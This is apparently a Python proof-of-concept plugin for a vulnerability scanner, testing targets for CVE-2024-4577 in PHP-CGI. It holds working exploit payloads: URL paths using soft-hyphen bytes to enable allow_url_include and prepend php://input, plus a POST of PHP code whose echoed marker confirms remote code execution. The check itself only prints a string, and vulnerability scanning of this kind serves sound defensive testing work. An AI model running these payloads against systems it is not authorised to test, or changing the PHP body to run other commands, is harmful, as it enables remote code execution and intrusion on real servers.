from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "CVE-2024-4577"
        self.app_name = 'PHP'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    
    def verify(self, target):
        
        payloads = ['/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
        '/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input']
        
        php_code = '<?php echo "Oyst3r"; ?>'
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        check = b"Oyst3r"
        self.logger.info("verify {}".format(target))
        for payload in payloads:
            url = target + payload
            response = http_req(url,"post",headers=headers,data=php_code)
            response_text = response.content
            if check in response_text:
                self.logger.success("found {} {}".format(self.app_name, url))
                return url